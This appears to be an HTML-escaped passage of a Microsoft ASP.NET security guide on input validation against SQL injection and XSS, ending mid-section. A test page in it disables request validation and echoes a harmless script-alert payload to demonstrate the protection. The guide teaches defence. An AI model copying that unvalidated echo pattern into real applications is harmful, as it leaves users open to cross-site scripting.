&lt;li&gt;Constrain input for length, range, format, and type. &lt;/li&gt;&lt;li&gt;Apply ASP.NET request validation during development to identify injection attacks.
&lt;/li&gt;&lt;li&gt;Constrain input by using ASP.NET validator controls. &lt;/li&gt;&lt;li&gt;Encode unsafe output. &lt;/li&gt;&lt;li&gt;Help prevent SQL injection by using command parameters. &lt;/li&gt;&lt;li&gt;Prevent detailed error information from returning to the client. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;You need to validate all untrusted input to your application. You should assume that any input from users is malicious. User input to your Web application includes form fields, query strings, client-side cookies, and browser environment values such as user
 agent strings and IP addresses. &lt;/p&gt;
&lt;p&gt;Weak input validation is a common vulnerability that could allow your application to be exploited by a number of injection attacks. The following are common types of attacks that exploit weak or missing input validation:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SQL injection. &lt;/strong&gt;If you generate dynamic SQL queries based on user input, an attacker could inject malicious SQL commands that can be executed by the database.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Cross-site scripting.&lt;/strong&gt; Cross-site scripting (XSS) attacks exploit vulnerabilities in Web page validation by injecting client-side script code. This code is subsequently sent to an unsuspecting user's computer and executed on the browser.
 Because the browser downloads the script code from a trusted site, the browser has no way of determining whether the code is legitimate.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Unauthorized file access.&lt;/strong&gt; If your code accepts input from a caller, a malicious user could potentially manipulate your code's file operations, such as accessing a file they should not access or exploiting your code by injecting bad data.
&lt;/li&gt;&lt;/ul&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Injection attacks work over HTTP and HTTPS Secure Socket Layer (SSL) connections. Encryption provides no defense.&lt;/blockquote&gt;
&lt;p&gt;The general approach for input validation is summarized here. You should apply this approach to any input that comes from the network, such as text boxes and other forms field input, query string parameters, cookies, server variables, and Web method parameters.
 Note that the strategy is to first allow only good input and then deny bad input. This is because you can easily define good input for your application, but you cannot realistically anticipate the format for all malicious input.
&lt;/p&gt;
&lt;p&gt;Check for valid input as follows: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Constrain: &lt;/strong&gt;Check for known good data by validating the type, length, format, and range. To constrain input from server controls, use the ASP.NET validator controls. To constrain input from other sources, use regular expressions and custom
 validation. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Reject:&lt;/strong&gt; Check for any known bad data and reject bad input. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Sanitize:&lt;/strong&gt; Sometimes you also need to sanitize input and make potentially malicious input safe. For example, if your application supports free-format input fields, such as comment fields, you might want to permit certain safe HTML elements,
 such as &amp;lt;&lt;strong&gt;b&lt;/strong&gt;&amp;gt; and &amp;lt;&lt;strong&gt;i&lt;/strong&gt;&amp;gt;, and eliminate any other HTML elements.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Summary of Steps&lt;/h1&gt;
&lt;p&gt;To protect your ASP.NET application from injection attacks, perform the following steps:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1. Use ASP.NET request validation. &lt;/li&gt;&lt;li&gt;Step 2. Constrain input. &lt;/li&gt;&lt;li&gt;Step 3. Encode unsafe output. &lt;/li&gt;&lt;li&gt;Step 4. Use command parameters for SQL queries. &lt;/li&gt;&lt;li&gt;Step 5. Verify that ASP.NET errors are not returned to the client. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The next sections describe each of these.&lt;/p&gt;
&lt;h1&gt;Step 1. Use ASP.NET Request Validation&lt;/h1&gt;
&lt;p&gt;By default, ASP.NET request validation detects any HTML elements and reserved characters in data posted to the server. This helps prevent users from inserting script into your application. Request validation checks all input data against a hard-coded list
 of potentially dangerous values. If a match occurs, it throws an exception of type
&lt;strong&gt;HttpRequestValidationException&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;You can disable request validation in your Web.config application configuration file by adding a &amp;lt;&lt;strong&gt;pages&lt;/strong&gt;&amp;gt; element with
&lt;strong&gt;validateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt; or on an individual page by setting &lt;strong&gt;
ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt; on the &lt;strong&gt;@ Pages&lt;/strong&gt; element. &lt;/p&gt;
&lt;p&gt;If you need to disable request validation, you should disable it only on the affected page. An example of this is when you have a page with a free-format text field that accepts HTML-formatted input.&lt;/p&gt;
&lt;h2&gt;Confirm that ASP.NET Request Validation Is Enabled in Machine.config&lt;/h2&gt;
&lt;p&gt;Request validation is enabled by ASP.NET by default. You can see the following default setting in the Machine.config.comments file.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;pages validateRequest=&amp;quot;true&amp;quot; ... /&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Confirm that you have not disabled request validation by overriding the default settings in your server's Machine.config file or your application's Web.config file.
&lt;/p&gt;
&lt;h2&gt;Test ASP.NET Request Validation&lt;/h2&gt;
&lt;p&gt;You can test the effects of request validation. To do this, create an ASP.NET page that disables request validation by setting
&lt;strong&gt;ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt;, as follows.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Language=&amp;quot;C#&amp;quot; ValidateRequest=&amp;quot;false&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; void btnSubmit_Click(Object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // If ValidateRequest is false, then 'hello' is displayed&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // If ValidateRequest is true, then ASP.NET returns an exception&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(txtString.Text);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;nbsp;&amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox id=&amp;quot;txtString&amp;quot; runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;&amp;lt;script&amp;gt;alert('hello');&amp;lt;/script&amp;gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button id=&amp;quot;btnSubmit&amp;quot; runat=&amp;quot;server&amp;quot; OnClick=&amp;quot;btnSubmit_Click&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;Submit&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;When you run the page, &amp;quot;Hello&amp;quot; is displayed in a message box because the script in
&lt;strong&gt;txtString&lt;/strong&gt; is passed through and rendered as client-side script in your browser.&lt;/p&gt;
&lt;p&gt;If you set &lt;strong&gt;ValidateRequest=&amp;quot;true&amp;quot; &lt;/strong&gt;or remove the &lt;strong&gt;ValidateRequest&lt;/strong&gt; page attribute, ASP.NET request validation rejects the script input and produces an error similar to the following.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;A potentially dangerous Request.Form value was detected from the client (txtString=&amp;quot;&amp;lt;script&amp;gt;alert('hello...&amp;quot;).  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Do not rely on ASP.NET request validation. Treat it as an extra precautionary measure in addition to your own input validation.&lt;/blockquote&gt;
&lt;h1&gt;Step 2. Constrain Input&lt;/h1&gt;
&lt;p&gt;To constrain input, follow these guidelines: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Use server-side input validation.&lt;/strong&gt; Do not rely on client-side validation because it is easily bypassed. Use client-side validation in addition to server-side validation to reduce round trips to the server and to improve the user experience.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Validate length, range, format and type.&lt;/strong&gt; Make sure that any input meets your guidelines for known good input.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use strong data typing. &lt;/strong&gt;Assign numeric values to numeric data types such as
&lt;strong&gt;Integer&lt;/strong&gt; or &lt;strong&gt;Double&lt;/strong&gt;. Assign string values to string data types. Assign dates to the
&lt;strong&gt;DateTime&lt;/strong&gt; data type. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For Web form applications that obtain input through server controls, use the ASP.NET validator controls to constrain the input. For other sources of input data, such as query strings, cookies, and HTTP headers, constrain input by using the
&lt;strong&gt;Regex&lt;/strong&gt; class from the &lt;strong&gt;System.Text.RegularExpressions&lt;/strong&gt; namespace.&lt;/p&gt;
&lt;h2&gt;Explicitly Check Input from Form Fields&lt;/h2&gt;
&lt;p&gt;To constrain form field input received through server controls, you can use the following ASP.NET validator controls:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;RegularExpressionValidator.&lt;/strong&gt; Use this control to constrain text input.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;RangeValidator.&lt;/strong&gt; Use this control to check the ranges of numeric, currency, date, and string input.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CustomValidator.&lt;/strong&gt; Use this control for custom validation, such as ensuring that a date is in the future or in the past.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;To validate form field input received through HTML input controls, perform validation in server-side code and use the
&lt;strong&gt;Regex&lt;/strong&gt; class to help constrain text input. The following sections describe how to constrain a variety of common input types.&lt;/p&gt;
&lt;h3&gt;Validating Text Fields &lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;To validate text fields, such as names, addresses, and tax identification numbers, use regular expressions to do the following:
&lt;/li&gt;&lt;li&gt;Constrain the acceptable range of input characters. &lt;/li&gt;&lt;li&gt;Apply formatting rules. For example, pattern-based fields, such as tax identification numbers, ZIP Codes, or postal codes, require specific patterns of input characters.
&lt;/li&gt;&lt;li&gt;Check lengths. &lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Using a RegularExpressionValidator&lt;/h3&gt;
&lt;p&gt;To use a &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt;, set the &lt;strong&gt;ControlToValidate&lt;/strong&gt;,
&lt;strong&gt;ValidationExpression&lt;/strong&gt;, and &lt;strong&gt;ErrorMessage &lt;/strong&gt;properties to appropriate values as shown in the following example.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;form id=&amp;quot;WebForm&amp;quot; method=&amp;quot;post&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;asp:TextBox id=&amp;quot;txtName&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&amp;lt;/asp:TextBox&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;asp:RegularExpressionValidator id=&amp;quot;nameRegex&amp;quot; runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;txtName&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ValidationExpression=&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;Invalid name&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/asp:regularexpressionvalidator&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The regular expression used in the preceding code example limits an input name field to alphabetic characters (lowercase and uppercase), space characters, the single apostrophe for names such as O'Dell, and the period. In addition, the field length is constrained
 to 40 characters.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control automatically adds a caret (^) and dollar sign ($) as delimiters to the beginning and end of expressions if you have not added them yourself. You should add them to
 all of your regular expressions as good practice. Enclosing the expression in the delimiters ensures that the expression consists of the desired content and nothing else.&lt;/blockquote&gt;
&lt;h3&gt;Using the Regex Class&lt;/h3&gt;
&lt;p&gt;If you are not using server controls (which means you cannot use the validator controls), or you need to validate input from sources other than form fields (such as from query string parameters or cookies), you can use a
&lt;strong&gt;Regex&lt;/strong&gt; class.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To use the Regex class&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Add a &lt;strong&gt;using&lt;/strong&gt; statement to reference the&lt;strong&gt; System.Text.RegularExpressions&lt;/strong&gt; namespace.
&lt;/li&gt;&lt;li&gt;Ensure that the regular expression is contained in the ^ and $ anchor characters (beginning of string, end of string).
&lt;/li&gt;&lt;li&gt;Call the &lt;strong&gt;IsMatch&lt;/strong&gt; method of the &lt;strong&gt;Regex&lt;/strong&gt; class, as shown in the following code example.
&lt;/li&gt;&lt;/ol&gt;
&lt;div&gt;
&lt;pre&gt;// Instance method:&lt;br&gt;Regex reg = new Regex(@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;);&lt;br&gt;Response.Write(reg.IsMatch(txtName.Text));&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;// Static method:&lt;br&gt;if (!Regex.IsMatch(txtName.Text,@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;)) &lt;br&gt;{&lt;br&gt;&amp;nbsp; // Name does not match expression&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;If you cannot cache your regular expression for frequent use, you should use the static
&lt;strong&gt;IsMatch&lt;/strong&gt; method where possible for performance reasons, to avoid unnecessary object creation.&lt;/p&gt;
&lt;h3&gt;Validating Numeric Fields&lt;/h3&gt;
&lt;p&gt;In most cases, numeric fields should be checked for type and range. To validate the type and range of a numeric input field that uses a server control, you can use a
&lt;strong&gt;RangeValidator&lt;/strong&gt; control. The &lt;strong&gt;RangeValidator&lt;/strong&gt; supports currency, date, integer, double, and string data types.
&lt;/p&gt;
&lt;p&gt;To use a &lt;strong&gt;RangeValidator&lt;/strong&gt;, set the &lt;strong&gt;ControlToValidate&lt;/strong&gt;,
&lt;strong&gt;Type&lt;/strong&gt;, &lt;strong&gt;MinimumValue&lt;/strong&gt;, &lt;strong&gt;MaximumValue&lt;/strong&gt;, and
&lt;strong&gt;ErrorMessage&lt;/strong&gt; properties to appropriate values as shown in the following example.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;asp:RangeValidator &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ID=&amp;quot;RangeValidator1&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;Invalid range. Number must be between 0 and 255.&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;rangeInput&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MaximumValue=&amp;quot;255&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MinimumValue=&amp;quot;0&amp;quot; Type=&amp;quot;Integer&amp;quot; /&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;If you are not using a server control, you can validate a numeric range by converting the input value to an integer and then performing a range check. For example, to validate that an integer is valid, convert the input value to a variable of type
&lt;strong&gt;System.Int32&lt;/strong&gt; by using the &lt;strong&gt;Int32.TryParse&lt;/strong&gt; method. This method returns
&lt;strong&gt;false&lt;/strong&gt; if the type conversion fails.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Int32 i;&lt;br&gt;if (Int32.TryParse(txtInput.Text, out i) == false)&lt;br&gt;{&lt;br&gt;&amp;nbsp; // Conversion failed&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following code shows how to perform a type and range check for an integer entered through an HTML text input control.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (Request.RequestType == &amp;quot;POST&amp;quot;)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; int i;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (Int32.TryParse(Request.Form[&amp;quot;integerTxt&amp;quot;], out i) == true)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // TryParse returns true if the conversion succeeds&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ((0 &amp;lt;= i &amp;amp;&amp;amp; i &amp;lt;= 255) == true)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Input data is valid.&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Input data is out of range&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Input data is not an integer&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; action=&amp;quot;NumericInput.aspx&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Enter an integer between 0 and 255:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input name=&amp;quot;integerTxt&amp;quot; type=&amp;quot;text&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input name=&amp;quot;Submit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;submit&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;h3&gt;Validating Date Fields&lt;/h3&gt;
&lt;p&gt;You need to validate that date fields are of the correct type. In most cases, you also need to check them for range, for example to validate that they are in the future or past. If you use a server control to capture an input date, and if you also need to
 validate that a date falls within a specific range, you can use a &lt;strong&gt;RangeValidator&lt;/strong&gt; control with its
&lt;strong&gt;Type&lt;/strong&gt; field set to &lt;strong&gt;Date&lt;/strong&gt;. This control lets you specify a range by using constant date values. If you need to validate a date range based on today's date, for example to validate that a date is in the future or the past, you
 can use a &lt;strong&gt;CustomValidator&lt;/strong&gt; control.&lt;/p&gt;
&lt;p&gt;To use a &lt;strong&gt;CustomValidator&lt;/strong&gt; control to validate a date, set the &lt;strong&gt;
ControlToValidate&lt;/strong&gt; and &lt;strong&gt;ErrorMessage&lt;/strong&gt; properties and the &lt;strong&gt;
OnServerValidate&lt;/strong&gt; event to point to a custom method containing your validation logic. The following sample .aspx page code shows this approach.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;void ValidateDateInFuture(object source, ServerValidateEventArgs args)&lt;br&gt;&amp;nbsp;{&lt;br&gt;&amp;nbsp;&amp;nbsp; DateTime dt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp; // Check for valid date and that the date is in the future&lt;br&gt;&amp;nbsp;&amp;nbsp; if ((DateTime.TryParse(args.Value, out dt) == false) || &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (dt &amp;lt;= DateTime.Today))&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; args.IsValid = false;&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;}&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Label ID=&amp;quot;Label1&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;Future Date:&amp;quot;&amp;gt;&amp;lt;/asp:Label&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox ID=&amp;quot;futureDatetxt&amp;quot; Runat=&amp;quot;server&amp;quot;&amp;gt;&amp;lt;/asp:TextBox&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:CustomValidator &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ID=&amp;quot;CustomValidator1&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;Invalid date. Enter a date in the future.&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;futureDatetxt&amp;quot;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnServerValidate=&amp;quot;ValidateDateInFuture&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/asp:CustomValidator&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;submitBtn&amp;quot; Runat=&amp;quot;server&amp;quot; Text=&amp;quot;Submit&amp;quot;&amp;nbsp; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The preceding code uses &lt;strong&gt;DateTime.TryParse&lt;/strong&gt;, which is new to .NET Framework 2.0.&lt;/blockquote&gt;
&lt;h2&gt;Sanitizing Free-Text Fields&lt;/h2&gt;
&lt;p&gt;To &lt;em&gt;sanitize&lt;/em&gt; input, you make untrusted input safe by preventing it from being treated as code. For example, if your application handles user input that it cannot constrain or reads data from a shared database, you might need to sanitize the data
 or make the output safe when you write it on your page. Sanitize data prior to output by using
&lt;strong&gt;AntiXSSLibrary.HtmlEncode&lt;/strong&gt;. &lt;/p&gt;
&lt;h2&gt;Allowing Restricted HTML Input&lt;/h2&gt;
&lt;p&gt;If your application needs to accept a range of HTML elements—for example through a rich text input field such as a comments field—turn off ASP.NET request validation and create a filter that allows only the HTML elements that you want your application to
 accept. A common practice is to restrict formatting to safe HTML elements such as &amp;lt;&lt;strong&gt;b&lt;/strong&gt;&amp;gt; (bold) and &amp;lt;&lt;strong&gt;i&lt;/strong&gt;&amp;gt; (italic). Before writing the data, HTML-encode it. This makes any malicious script safe by causing it to be handled as text,
 not as executable code. &lt;/p&gt;
&lt;h2&gt;To allow restricted HTML input &lt;/h2&gt;
&lt;ol&gt;
